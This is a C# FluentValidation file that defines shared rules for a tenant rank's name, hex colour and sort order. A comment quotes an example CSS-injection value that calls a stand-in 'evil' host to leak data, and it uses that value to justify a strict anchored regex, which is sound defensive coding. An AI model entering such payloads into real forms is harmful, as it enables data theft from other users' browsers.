using FluentValidation;

namespace AegisScribe.Domain.Managers.Validators;

// The shape rules a create and an update of a TenantRank have in common — one place to change the
// format instead of two, the same job CharacterValidationRules does for realm/region.
internal static class RankValidationRules
{
    // Mirrors TenantRank.Name's HasMaxLength(32). Short on purpose: the rank renders inside a pill
    // next to a character name, and a 200-character rank is a broken roster row, not a long label.
    public static IRuleBuilderOptions<T, string> RankName<T>(this IRuleBuilder<T, string> rule) =>
        rule.NotEmpty().MaximumLength(32);

    // This is a security control, not a formatting preference. The value is written into the rank
    // pill's --rank-color custom property in the browser, so anything other than exactly #rrggbb is
    // CSS injected through a settings form — `#fff; background: url(https://evil/leak?x=` is a valid
    // "colour" to a looser rule. Anchored at both ends, six digits, nothing else accepted.
    //
    // Shorthand (#fff) and named colours are rejected rather than normalised: one canonical form
    // means the UI never has to guess, and relaxing a validation rule later is additive and safe
    // while tightening one is breaking (api-contract.md).
    public static IRuleBuilderOptions<T, string> RankColour<T>(this IRuleBuilder<T, string> rule) =>
        rule.NotEmpty()
            .Matches("^#[0-9a-fA-F]{6}$")
            .WithMessage("Colour must be a six-digit hex value such as #cba76a.");

    // Bounded so the ladder stays a ladder. Any int sorts correctly, but a UI that lets an officer
    // drag ranks around has to write positions back, and an unbounded range invites int.MaxValue
    // sentinels that the next reorder cannot express a position above.
    public static IRuleBuilderOptions<T, int> RankSortOrder<T>(this IRuleBuilder<T, int> rule) =>
        rule.InclusiveBetween(0, 999);
}
